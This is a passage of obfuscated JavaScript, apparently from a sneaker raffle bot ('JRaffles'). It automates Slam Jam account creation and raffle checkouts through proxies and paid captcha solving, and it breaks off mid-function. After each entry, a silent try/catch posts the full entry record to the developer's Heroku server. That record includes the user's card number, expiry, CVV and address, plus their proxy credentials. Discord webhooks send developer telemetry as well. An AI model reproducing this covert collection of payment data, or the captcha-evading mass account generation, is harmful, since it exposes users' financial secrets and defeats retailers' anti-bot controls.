                                try {
                                    await _0xfbdaa0['click']('label[data-eu-size=\x22' + _0x37f78d[_0x1f5cce]['Size'] + '\x22]');
                                } catch {
                                    await _0xfbdaa0['click']('label[data-eu-size=\x22' + _0x37f78d[_0x1f5cce]['Size'] + '.0\x22]');
                                }
                            }
                            await _0x572e60(0xbb8), await _0xfbdaa0['$$eval']('.raffle__checkbox-label', _0x42820b => _0x42820b['forEach'](_0x3a6f1a => _0x3a6f1a['click']())), await _0x572e60(0x7d0), console['log'](_0xed09ee() + '\x20[' + _0x12dc59['name'] + ']\x20Task\x20' + (_0x1f5cce + 0x1) + '\x20:\x20Submitting\x20Entry'), await _0xfbdaa0['click']('#raffle__form-submit'), await _0x572e60(0x1388);
                            try {
                                await _0xfbdaa0['waitForSelector']('#raffle__confirmation-message-container'), _0x40f807 = 'no', _0x14aa55(_0x37f78d[_0x1f5cce], _0x12dc59), console['log'](_0x2d77f8['green'](_0xed09ee() + '\x20[' + _0x12dc59['name'] + ']\x20Task\x20' + (_0x1f5cce + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                let _0x2a06b7 = _0x37f78d[_0x1f5cce];
                                try {
                                    prxdata = {
                                        'username': _0x447b4a['replace']('#', ''),
                                        'module': _0x12dc59['name'],
                                        'entrydata': JSON['stringify'](_0x2a06b7),
                                        'proxy': '' + _0x140af4[_0x1f5cce]
                                    };
                                    var _0x12a330 = JSON['stringify'](prxdata);
                                    let _0xb48dad = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x3b676e['post']('https://jraffles.herokuapp.com/success', _0x12a330, _0xb48dad);
                                } catch (_0x288549) {
                                }
                            } catch (_0x59dd32) {
                                console['log'](_0x2d77f8['red'](_0xed09ee() + '\x20[' + _0x509612[taskModule]['name'] + ']\x20Task\x20' + (_0x1f5cce + 0x1) + '\x20:\x20Raffle\x20entry\x20failed.\x20' + _0x59dd32));
                            }
                        } catch (_0x290ec7) {
                            console['log'](_0x2d77f8['red'](_0xed09ee() + '\x20[' + _0x509612[taskModule]['name'] + ']\x20Task\x20' + (_0x1f5cce + 0x1) + '\x20:\x20' + _0x290ec7)), _0x40f807 = 'yes';
                        } finally {
                            _0x2e83ec && _0x2e83ec['close']();
                            if (_0x40f807 == 'yes' && _0x19be48 != 0x5 && _0x1ba16c != 'Size\x20Not\x20Found') {
                                console['log'](_0x2d77f8['red'](_0xed09ee() + '\x20[' + _0x12dc59['name'] + ']\x20Task\x20' + (_0x1f5cce + 0x1) + '\x20:\x20Retrying\x20(' + _0x19be48 + '\x20/\x205)')), _0x1f5cce = _0x1f5cce - 0x1, _0x19be48 = _0x19be48 + 0x1;
                                continue;
                            }
                            _0x40f807 == 'yes' && _0x19be48 >= 0x5 && (_0x58f6f1(_0x37f78d[_0x1f5cce], _0x12dc59), _0x40f807 = 'no', _0x19be48 = 0x0), console['log']('Waiting\x20for\x20' + _0x114346['delay'] + '\x20ms'), await _0x572e60(_0x114346['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'SLAM\x20JAM',
        'modules': [
            {
                'name': 'SLAM\x20JAM\x20Account\x20Generator',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x2255d8, _0x5466cc, _0x5b6d96) {
                    _0x5dd90e['use'](_0x118712()), _0x5dd90e['use'](_0x1e1820({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x114346['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x3d0677 = 0x0; _0x3d0677 < _0x5466cc['length']; _0x3d0677++) {
                        if (_0x2c73d5 != 'yes')
                            var _0x2c73d5 = '', _0x593aee = 0x0;
                        var _0x31c278 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x447b4a
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x114346['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x92063b
                                }
                            ]
                        }];
                        const _0x394fe7 = { 'embeds': _0x31c278 };
                        _0x59687e(_0x2255d8['name'] + '\x20Task\x20' + (_0x3d0677 + 0x1) + '\x20/\x20' + _0x5466cc['length'] + '\x20||\x20File:\x20' + _0x2b0c3a + '\x20Proxies:\x20' + _0x5e9a1f);
                        try {
                            await _0x44ca58(_0x5466cc, _0x3d0677);
                        } catch {
                            _0x2c73d5 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x1c6304 = await _0x254487(_0x5466cc[_0x3d0677], _0x2255d8, 'acc', ![]);
                        const _0x3a27f0 = { 'succesDEVMSG': { 'embeds': [_0x1c6304] } };
                        if (_0x5466cc[_0x3d0677]['Email'] == '' || _0x5466cc[_0x3d0677]['FirstName'] == '' || _0x5466cc[_0x3d0677]['LastName'] == '') {
                            console['log'](_0xed09ee() + '\x20[' + _0x509612[taskModule]['name'] + ']\x20Task\x20' + (_0x3d0677 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x572e60(0x7d0);
                            continue;
                        }
                        (_0x5466cc[_0x3d0677]['Password'] == '' || _0x5466cc[_0x3d0677] == undefined) && _0x5466cc[_0x3d0677]['Password'] == 'JRaffles23!';
                        if (_0x114346['useRandomProxy'] = ![])
                            var _0x4c27ed = _0x5b6d96[_0x3d0677]['split'](':');
                        else
                            var _0x4b5246 = Math['round'](Math['random']() * (_0x5b6d96['length'] - 0x1)), _0x4c27ed = _0x5b6d96[_0x4b5246]['split'](':');
                        var _0x2e3213;
                        try {
                            _0x2e3213 = await _0x5dd90e['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x4c27ed[0x0] + ':' + _0x4c27ed[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x2e3213 = await _0x5dd90e['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x4c27ed[0x0] + ':' + _0x4c27ed[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x3201b3 = await _0x2e3213['newPage']();
                            await _0x3201b3['authenticate']({
                                'username': '' + _0x4c27ed[0x2],
                                'password': '' + _0x4c27ed[0x3]
                            }), console['log'](_0xed09ee() + '\x20[' + _0x2255d8['name'] + ']\x20Task\x20' + (_0x3d0677 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x3201b3['setRequestInterception'](!![]), _0x3201b3['on']('request', _0x5be490 => {
                                _0x5be490['resourceType']() === 'image' || _0x5be490['resourceType']() === 'font' || _0x5be490['resourceType']() === 'media' ? _0x5be490['abort']() : _0x5be490['continue']();
                            }), await _0x3201b3['goto']('https://drop.slamjam.com/account/register'), await _0x572e60(0xbb8), await _0x3201b3['waitForSelector']('#FirstName'), await _0x3201b3['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x3201b3['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), console['log'](_0xed09ee() + '\x20[' + _0x2255d8['name'] + ']\x20Task\x20' + (_0x3d0677 + 0x1) + '\x20:\x20Filling\x20information'), await _0x572e60(0x4b0), await _0x3201b3['type']('#FirstName', '' + _0x5466cc[_0x3d0677]['FirstName']), await _0x572e60(0x226), await _0x3201b3['type']('#LastName', '' + _0x5466cc[_0x3d0677]['LastName']), await _0x572e60(0x226), await _0x3201b3['type']('#Email', '' + _0x5466cc[_0x3d0677]['Email']), await _0x572e60(0x2ee), await _0x3201b3['type']('#ConfirmEmail', '' + _0x5466cc[_0x3d0677]['Email']), await _0x572e60(0x2ee), await _0x3201b3['type']('#CreatePassword', '' + _0x5466cc[_0x3d0677]['Password']), await _0x572e60(0x2ee), await _0x3201b3['type']('#CreateConfirmPassword', '' + _0x5466cc[_0x3d0677]['Password']), await _0x572e60(0x226), console['log'](_0xed09ee() + '\x20[' + _0x2255d8['name'] + ']\x20Task\x20' + (_0x3d0677 + 0x1) + '\x20:\x20Submitting..'), await _0x3201b3['$eval']('#create_customer', _0x2ad2e5 => _0x2ad2e5['submit']()), await _0x572e60(0x1388), console['log'](_0xed09ee() + '\x20[' + _0x2255d8['name'] + ']\x20Task\x20' + (_0x3d0677 + 0x1) + '\x20:\x20' + _0x2d77f8['cyan']('Solving\x20Captcha')), await _0x3201b3['solveRecaptchas'](), console['log'](_0xed09ee() + '\x20[' + _0x2255d8['name'] + ']\x20Task\x20' + (_0x3d0677 + 0x1) + '\x20:\x20Captcha\x20solved'), await _0x3201b3['$eval']('.shopify-challenge__container\x20>\x20form', _0x50a4cf => _0x50a4cf['submit']());
                            try {
                                await _0x3201b3['waitForSelector']('.product-card__image'), await _0x572e60(0x1f4), _0x2c73d5 = 'no', console['log'](_0x2d77f8['green'](_0xed09ee() + '\x20[' + _0x2255d8['name'] + ']\x20Task\x20' + (_0x3d0677 + 0x1) + '\x20:\x20Account\x20' + _0x5466cc[_0x3d0677]['Email'] + '\x20Generated!')), _0x3d3f42['appendFileSync']('../accounts/slamjam.csv', '\x0a' + _0x5466cc[_0x3d0677]['Email'] + ',' + _0x5466cc[_0x3d0677]['Password']), console['log'](_0x2d77f8['yellow'](_0xed09ee() + '\x20[' + _0x2255d8['name'] + ']\x20Task\x20' + (_0x3d0677 + 0x1) + '\x20:\x20Account\x20' + _0x5466cc[_0x3d0677]['Email'] + '\x20Saved\x20in\x20\x27accounts/slamjam.csv\x27'));
                                try {
                                    _0x114346['webhook'] != undefined && _0x114346['webhook'] != '' && await _0x5641c6(_0x114346['webhook'], _0x3a27f0['succesDEVMSG']);
                                } catch {
                                }
                                await _0x5641c6(_0x34385d, _0x3a27f0['succesDEVMSG']);
                            } catch (_0x19a64a) {
                                console['log'](_0x2d77f8['red'](_0xed09ee() + '\x20[' + _0x509612[taskModule]['name'] + ']\x20Task\x20' + (_0x3d0677 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x19a64a));
                            }
                        } catch (_0x552c2c) {
                            console['log'](_0x2d77f8['red'](_0xed09ee() + '\x20[' + _0x509612[taskModule]['name'] + ']\x20Task\x20' + (_0x3d0677 + 0x1) + '\x20:\x20' + _0x552c2c));
                        } finally {
                            _0x2e3213 && _0x2e3213['close']();
                            if (_0x2c73d5 == 'yes' && _0x593aee != 0x5) {
                                console['log'](_0x2d77f8['red'](_0xed09ee() + '\x20[' + _0x2255d8['name'] + ']\x20Task\x20' + (_0x3d0677 + 0x1) + '\x20:\x20Retrying\x20(' + _0x593aee + '\x20/\x205)')), _0x3d0677 = _0x3d0677 - 0x1, _0x593aee = _0x593aee + 0x1;
                                continue;
                            }
                            _0x2c73d5 == 'yes' && _0x593aee >= 0x5 && (_0x58f6f1(_0x5466cc[_0x3d0677], _0x2255d8), _0x2c73d5 = 'no', _0x593aee = 0x0), console['log']('Waiting\x20for\x20' + _0x114346['delay'] + '\x20ms'), await _0x572e60(_0x114346['delay']);
                        }
                    }
                }
            },
            {
                'name': 'SLAM\x20JAM\x20Raffle\x20Entries',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x11e1c2, _0x2d2238, _0x54d0f3) {
                    _0x5dd90e['use'](_0x118712()), _0x5dd90e['use'](_0x1e1820({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x114346['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x36866c = 0x0; _0x36866c < _0x2d2238['length']; _0x36866c++) {
                        var _0x383281;
                        if (_0x249277 != 'yes')
                            var _0x249277 = '', _0x5ef3e4 = 0x0;
                        _0x59687e(_0x11e1c2['name'] + '\x20Task\x20' + (_0x36866c + 0x1) + '\x20/\x20' + _0x2d2238['length'] + '\x20||\x20File:\x20' + _0x2b0c3a + '\x20Proxies:\x20' + _0x5e9a1f);
                        try {
                            await _0x44ca58(_0x2d2238, _0x36866c);
                        } catch {
                            _0x249277 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x2d2238[_0x36866c]['Email'] == '' || _0x2d2238[_0x36866c]['Password'] == '' || _0x2d2238[_0x36866c]['FirstName'] == '' || _0x2d2238[_0x36866c]['LastName'] == '') {
                            console['log'](_0xed09ee() + '\x20[' + _0x11e1c2['name'] + ']\x20Task\x20' + (_0x36866c + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x114346['useRandomProxy'] = ![])
                            var _0x25b701 = _0x54d0f3[_0x36866c]['split'](':');
                        else
                            var _0x519ee3 = Math['round'](Math['random']() * (_0x54d0f3['length'] - 0x1)), _0x25b701 = _0x54d0f3[_0x519ee3]['split'](':');
                        var _0x3d374f;
                        try {
                            _0x3d374f = await _0x5dd90e['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x25b701[0x0] + ':' + _0x25b701[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x3d374f = await _0x5dd90e['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x25b701[0x0] + ':' + _0x25b701[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x336bb2 = await _0x3d374f['newPage']();
                            await _0x336bb2['authenticate']({
                                'username': '' + _0x25b701[0x2],
                                'password': '' + _0x25b701[0x3]
                            }), await _0x336bb2['setViewport']({
                                'width': 0x500,
                                'height': 0x2d0
                            }), console['log'](_0xed09ee() + '\x20[' + _0x11e1c2['name'] + ']\x20Task\x20' + (_0x36866c + 0x1) + '\x20:\x20Getting\x20Session'), await _0x336bb2['setRequestInterception'](!![]), _0x336bb2['on']('request', _0x5a28d8 => {
                                _0x5a28d8['resourceType']() === 'image' || _0x5a28d8['resourceType']() === 'font' || _0x5a28d8['resourceType']() === 'media' ? _0x5a28d8['abort']() : _0x5a28d8['continue']();
                            }), await _0x336bb2['goto']('https://drop.slamjam.com/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x336bb2['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x336bb2['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x572e60(0x258), await _0x336bb2['waitForSelector']('#CustomerEmail'), console['log'](_0xed09ee() + '\x20[' + _0x11e1c2['name'] + ']\x20Task\x20' + (_0x36866c + 0x1) + '\x20:\x20Logging\x20in..'), await _0x336bb2['type']('#CustomerEmail', '' + _0x2d2238[_0x36866c]['Email']), await _0x572e60(0x12c), await _0x336bb2['type']('#CustomerPassword', '' + _0x2d2238[_0x36866c]['Password']), await _0x572e60(0x226), await _0x336bb2['$eval']('#customer_login', _0x36d1f5 => _0x36d1f5['submit']()), await _0x572e60(0x7d0), await _0x336bb2['waitForSelector']('iframe[title=\x22reCAPTCHA\x22]'), console['log'](_0xed09ee() + '\x20[' + _0x11e1c2['name'] + ']\x20Task\x20' + (_0x36866c + 0x1) + '\x20:\x20' + _0x2d77f8['cyan']('Solving\x20Captcha')), await _0x336bb2['solveRecaptchas'](), console['log'](_0xed09ee() + '\x20[' + _0x11e1c2['name'] + ']\x20Task\x20' + (_0x36866c + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x336bb2['$eval']('.shopify-challenge__container\x20>\x20form', _0x156416 => _0x156416['submit']());
                            try {
                                await _0x336bb2['waitForSelector']('.nav-account'), await _0x572e60(0x4b0);
                            } catch {
                                console['log'](_0x2d77f8['red'](_0xed09ee() + '\x20[' + _0x11e1c2['name'] + ']\x20Task\x20' + (_0x36866c + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x336bb2['goto']('' + _0x2d2238[_0x36866c]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x572e60(0xbb8), console['log'](_0xed09ee() + '\x20[' + _0x11e1c2['name'] + ']\x20Task\x20' + (_0x36866c + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x336bb2['waitForSelector']('#ProductSelect-product-template-raffle');
                            } catch {
                            }
                            await _0x336bb2['click']('.product-select-variant-wrapper'), await _0x572e60(0x320), await _0x336bb2['click']('li.product-select-variant__value[data-size=\x22' + _0x2d2238[_0x36866c]['Size'] + '\x22]'), await _0x572e60(0x384), await _0x336bb2['$eval']('#AddToCartForm-product-template-raffle', _0x4ec18c => _0x4ec18c['submit']()), await _0x336bb2['waitForSelector']('.cart-order-summary__content'), await _0x572e60(0x514), await _0x336bb2['goto']('https://drop.slamjam.com/checkout'), await _0x572e60(0x514), await _0x336bb2['waitForSelector']('#checkout_shipping_address_country'), console['log'](_0xed09ee() + '\x20[' + _0x11e1c2['name'] + ']\x20Task\x20' + (_0x36866c + 0x1) + '\x20:\x20Filling\x20Information'), await _0x336bb2['select']('#checkout_shipping_address_country', '' + _0x2d2238[_0x36866c]['Country']), await _0x572e60(0x200), await _0x336bb2['waitForSelector']('#checkout_shipping_address_first_name'), await _0x336bb2['type']('#checkout_shipping_address_first_name', '' + _0x2d2238[_0x36866c]['FirstName']), await _0x572e60(0x237), await _0x336bb2['type']('#checkout_shipping_address_last_name', '' + _0x2d2238[_0x36866c]['LastName']), await _0x572e60(0x1e0), await _0x336bb2['type']('#checkout_shipping_address_address1', _0x2d2238[_0x36866c]['Address1'] + '\x20' + _0x2d2238[_0x36866c]['HouseNumber']), await _0x572e60(0x514), await _0x336bb2['type']('#checkout_shipping_address_address2', '' + _0x2d2238[_0x36866c]['Address2']), await _0x572e60(0x514);
                            _0x2d2238[_0x36866c]['Postcode'] == undefined && (_0x2d2238[_0x36866c]['Postcode'] = _0x2d2238[_0x36866c]['Zip']);
                            await _0x336bb2['type']('#checkout_shipping_address_zip', '' + _0x2d2238[_0x36866c]['Postcode']), await _0x572e60(0x2bc), await _0x336bb2['type']('#checkout_shipping_address_city', '' + _0x2d2238[_0x36866c]['City']), await _0x572e60(0x320), await _0x336bb2['type']('#checkout_shipping_address_phone', '' + _0x2d2238[_0x36866c]['Phone']), await _0x572e60(0x320), await _0x336bb2['click']('#continue_button'), await _0x572e60(0xbb8), await _0x336bb2['waitForSelector']('.summary-title'), await _0x572e60(0x320), await _0x336bb2['click']('#continue_button'), await _0x572e60(0x320), console['log'](_0xed09ee() + '\x20[' + _0x11e1c2['name'] + ']\x20Task\x20' + (_0x36866c + 0x1) + '\x20:\x20Finishing\x20Checkout'), await _0x336bb2['waitForSelector']('#checkout_credit_card_vault'), await _0x572e60(0x3e8);
                            var _0x2a46a8 = await _0x336bb2['$']('iframe[title=\x22Field\x20container\x20for:\x20Card\x20number\x22]'), _0x1d4ae0 = await _0x2a46a8['contentFrame']();
                            await _0x1d4ae0['click']('#number'), await _0x572e60(0x3e8), await _0x1d4ae0['type']('#number', '' + _0x2d2238[_0x36866c]['CardNumber'], { 'delay': 0x78 }), _0x2a46a8 = await _0x336bb2['$']('iframe[title=\x22Field\x20container\x20for:\x20Name\x20on\x20card\x22]'), _0x1d4ae0 = await _0x2a46a8['contentFrame'](), await _0x572e60(0x1c2), await _0x1d4ae0['click']('#name'), await _0x572e60(0x1f4), await _0x1d4ae0['type']('#name', '' + _0x2d2238[_0x36866c]['NameOnCard'], { 'delay': 0x78 }), _0x2a46a8 = await _0x336bb2['$']('iframe[title=\x22Field\x20container\x20for:\x20Expiration\x20date\x20(MM\x20/\x20YY)\x22]'), _0x1d4ae0 = await _0x2a46a8['contentFrame'](), await _0x572e60(0x1c2), await _0x1d4ae0['click']('#expiry'), await _0x572e60(0x1f4), await _0x1d4ae0['type']('#expiry', '' + _0x2d2238[_0x36866c]['ExpiryDate'], { 'delay': 0x78 }), _0x2a46a8 = await _0x336bb2['$']('iframe[title=\x22Field\x20container\x20for:\x20Security\x20code\x22]'), _0x1d4ae0 = await _0x2a46a8['contentFrame'](), await _0x572e60(0x1c2), await _0x1d4ae0['click']('#verification_value'), await _0x572e60(0x1f4), await _0x1d4ae0['type']('#verification_value', '' + _0x2d2238[_0x36866c]['CVV'], { 'delay': 0x78 }), await _0x336bb2['$eval']('#accepts-flag-raffle', _0x4a716f => _0x4a716f['click']()), await _0x572e60(0x7d0), console['log'](_0xed09ee() + '\x20[' + _0x11e1c2['name'] + ']\x20Task\x20' + (_0x36866c + 0x1) + '\x20:\x20Processing\x20Order'), await _0x336bb2['$eval']('#continue_button', _0x2591a1 => _0x2591a1['click']()), await _0x572e60(0x1b58), await _0x336bb2['waitForSelector']('.edit_checkout.animate-floating-labels'), await _0x336bb2['$eval']('.edit_checkout.animate-floating-labels', _0x208a36 => _0x208a36['submit']()), await _0x572e60(0x7d0);
                            try {
                                await _0x336bb2['waitForSelector']('div[data-step=\x22thank_you\x22]', { 'timeout': 0x493e0 }), _0x249277 = 'no', _0x14aa55(_0x2d2238[_0x36866c], _0x11e1c2), console['log'](_0x2d77f8['green'](_0xed09ee() + '\x20[' + _0x11e1c2['name'] + ']\x20Task\x20' + (_0x36866c + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            } catch (_0x59708c) {
                                throw new Error('Error\x20Processing\x20Order:\x20' + _0x59708c['message']);
                            }
                            var _0x56324d = await _0x254487(_0x2d2238[_0x36866c], _0x11e1c2, 'dev', ![]), _0x25018f = await _0x254487(_0x2d2238[_0x36866c], _0x11e1c2, 'pub', ![]);
                            let _0x1a20a5 = _0x2d2238[_0x36866c];
                            try {
                                prxdata = {
                                    'username': _0x447b4a['replace']('#', ''),
                                    'module': _0x11e1c2['name'],
                                    'entrydata': JSON['stringify'](_0x1a20a5),
                                    'proxy': '' + _0x54d0f3[_0x36866c]
                                };
                                var _0x29ba2f = JSON['stringify'](prxdata);
                                let _0x8a044 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x3b676e['post']('https://jraffles.herokuapp.com/success', _0x29ba2f, _0x8a044);
                            } catch (_0x5dae24) {
                            }
                            const _0x26d62c = {
                                'succesDEVMSG': { 'embeds': [_0x56324d] },
                                'succesPUBMSG': { 'embeds': [_0x25018f] }
                            };
                            try {
                                _0x114346['webhook'] != undefined && _0x114346['webhook'] != '' && await _0x5641c6(_0x114346['webhook'], _0x26d62c['succesDEVMSG']), await _0x572e60(0xc8), await _0x5641c6(_0x1543f5, _0x26d62c['succesDEVMSG']), await _0x572e60(0xc8), await _0x5641c6(_0x30beeb, _0x26d62c['succesPUBMSG']);
                            } catch (_0x55a066) {
                                console['log'](_0x2d77f8['yellow'](_0xed09ee() + '\x20[' + _0x509612[taskModule]['name'] + ']\x20Task\x20' + (_0x36866c + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x55a066));
                            }
                        } catch (_0x46d923) {
                            console['log'](_0x2d77f8['red'](_0xed09ee() + '\x20[' + _0x509612[taskModule]['name'] + ']\x20Task\x20' + (_0x36866c + 0x1) + '\x20:\x20' + _0x46d923)), _0x383281 = '' + _0x46d923;
                            var _0x44ef35 = await _0x254487(kickz[_0x36866c], _0x11e1c2, 'dev', !![], _0x383281);
                            EMBEDS['errorDEV'] = { 'embeds': [_0x44ef35] }, _0x114346['webhook'] != undefined && _0x114346['webhook'] != '' && await _0x5641c6(_0x114346['webhook'], EMBEDS['errorDEV']), await _0x5641c6(_0x188004, EMBEDS['errorDEV']), _0x249277 = 'yes';
                        } finally {
                            _0x3d374f && _0x3d374f['close']();
                            if (_0x249277 == 'yes' && _0x5ef3e4 != 0x5 && _0x383281 != 'Size\x20Not\x20Found') {
                                console['log'](_0x2d77f8['red'](_0xed09ee() + '\x20[' + _0x11e1c2['name'] + ']\x20Task\x20' + (_0x36866c + 0x1) + '\x20:\x20Retrying\x20(' + _0x5ef3e4 + '\x20/\x205)')), _0x36866c = _0x36866c - 0x1, _0x5ef3e4 = _0x5ef3e4 + 0x1;
                                continue;
                            }
                            _0x249277 == 'yes' && _0x5ef3e4 >= 0x5 && (_0x58f6f1(_0x2d2238[_0x36866c], _0x11e1c2), _0x249277 = 'no', _0x5ef3e4 = 0x0), console['log']('Waiting\x20for\x20' + _0x114346['delay'] + '\x20ms'), await _0x572e60(_0x114346['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'Failed\x20Tasks',
        'modules': [
            {
                'name': 'Retry\x20Failed\x20Tasks',
                'function': async function (_0x355e7a) {
                    var _0x205d18 = await _0x399720(), _0xda42b3 = _0x3d3f42['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x43afa1 = _0x365ef0['parse'](_0xda42b3, { 'header': !![] })['data'];
                    for (var _0x156692 = 0x0; _0x156692 < _0x43afa1['length']; _0x156692++) {
                        var _0x425f89 = _0x43afa1[_0x156692]['Store'], _0x2393d8 = _0x43afa1[_0x156692]['Mode'];
                        for (var _0x21be69 of _0x509612) {
                            const _0x3976fc = _0x21be69['name']['includes'](_0x425f89);
                            if (!_0x3976fc)
                                continue;
                            for (mode of _0x21be69['modules']) {
                                if (mode['name'] == _0x2393d8) {
                                    console['log']('Running\x20' + _0x2d77f8['cyan'](mode['name'])), await mode['function'](mode, [_0x43afa1[_0x156692]], _0x205d18);
                                    var _0x5d3be4 = _0xda42b3['split']('\x0a')['splice'](0x0, 0x1)['join']('\x0a');
                                    _0x3d3f42['writeFileSync']('../failed-tasks.csv', _0x5d3be4);
                                }
                            }
                        }
                    }
                }
            },
            {
                'name': 'Clear\x20Failed\x20Tasks',
                'function': async function () {
                    console['clear'](), console['log']('Are\x20you\x20sure\x20you\x20want\x20to\x20clear\x20\x22failed-tasks.csv\x22?\x20(y/n)');
                    var _0x58f079 = await _0x1e7814['get']('Answer');
                    if (_0x58f079['Answer']['toLowerCase']() == 'y') {
                        _0x3d3f42['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), console['clear'](), console['log']('Cleared\x20Failed\x20Tasks'), await _0x572e60(0x3e8);
                        return;
                    }
                    if (_0x58f079['Answer']['toLowerCase']() == 'n') {
                        console['clear'](), console['log']('Returning\x20to\x20Main\x20Menu'), await _0x572e60(0x3e8);
                        return;
                    }
                    return console['clear'](), console['log']('Invalid\x20Input'), await _0x572e60(0x3e8), this['function']();
                }
            }
        ]
    },
    { 'name': 'Paypal\x20Verification' },
    { 'name': 'Change\x20Settings' },
    { 'name': 'Reload\x20Settings' }
];
async function _0x3cf4df(_0x1fef2f) {
    var _0xefd1c1 = await _0x399720(), _0x13f4eb = _0x3d3f42['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x4252c9 = _0x365ef0['parse'](_0x13f4eb, { 'header': !![] })['data'];
    for (var _0x34cf14 = 0x0; _0x34cf14 < _0x4252c9['length']; _0x34cf14++) {
        var _0x353ae0 = _0x4252c9[_0x34cf14]['Store'], _0x16652f = _0x4252c9[_0x34cf14]['Mode'];
        for (var _0x71967c of _0x509612) {
            const _0x6d6058 = _0x71967c['name']['includes'](_0x353ae0);
            if (_0x6d6058)
                for (mode of _0x509612[_0x71967c]['modules']) {
                    const _0x17b2a5 = mode['name']['includes'](_0x16652f);
                    _0x17b2a5 && (_0x1fef2f = mode['name'], await mode['function'](_0x1fef2f, _0x4252c9[_0x34cf14], _0xefd1c1));
                }
        }
    }
}
async function _0x1f780c() {
    await _0x4e0b5b(), console['clear'](), _0x114346['threads'] = 0x1;
    if (_0x92063b != 'devkey') {
        let _0x4bbea8 = await _0x543d67['autoUpdate']();
        if (_0x4bbea8 === 'yes')
            return _0x3169d5('node\x20JRaffles.js');
        console['clear']();
    }
    if (_0x3ffad5 == '') {
        console['log']('No\x20key\x20found\x20in\x20settings.json');
        return await _0x572e60(0x2710);
        ;
    }
    await _0x44ca09(_0x3ffad5);
    if (_0x3b5825 === ![])
        return console['log']('Closing\x20Browser'), await _0x572e60(0xbb8);
    else
        try {
            var _0x18cbc7 = [{
                'type': 'rich',
                'title': 'User\x20Opened\x20JRaffles',
                'description': '',
                'color': 0xc0d6d6,
                'fields': [
                    {
                        'name': 'User',
                        'value': '' + _0x447b4a
                    },
                    {
                        'name': 'Version',
                        'value': '' + _0x92063b
                    }
                ]
            }];
            const _0x1c3a48 = { 'embeds': _0x18cbc7 };
            var _0x413b87 = await _0x254487(null, null, 'open', ![]);
            const _0x3d228d = { 'openDEVMSG': { 'embeds': [_0x413b87] } };
            await _0x5641c6(_0x5dfa1d, _0x3d228d['openDEVMSG']);
            async function _0x1e1ae6() {
